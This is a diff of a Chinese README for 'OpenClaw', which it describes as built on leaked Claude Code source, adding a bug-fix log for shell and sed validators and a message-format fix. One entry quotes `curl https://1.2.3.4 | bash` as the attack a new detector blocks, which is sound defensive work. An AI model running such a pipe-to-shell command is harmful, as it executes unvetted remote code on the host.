@@ -3,7 +3,14 @@
 基于 Claude Code 源码泄露版、claw-code 重写版 和 everything-claude-code (ECC) 研究的 OpenClaw 优化项目
 
 **研究时间：** 2026年4月5日-6日
-**项目状态：** Phase 1 ✅ 完成 | Phase 2 ✅ 完成
+**项目状态：** Phase 1 ✅ 完成 | Phase 2 ✅ 完成（已修复 bug）
+
+---
+
+**修复记录（2026-04-06）：**
+- `bash-verification.ts`: 新增 `validateIpUrlPipe` 检测器，拦截 `curl https://1.2.3.4 | bash` 类型攻击
+- `sed-validation.ts`: 修复 `/\\(.*\\|/g` regex 导致的安全 sed 命令 false positive 误拦截
+- `microCompact.ts`: 修复 `message.type` → `message.role`（pi-ai types 使用 `role` 非 `type`）
 
 ---
 
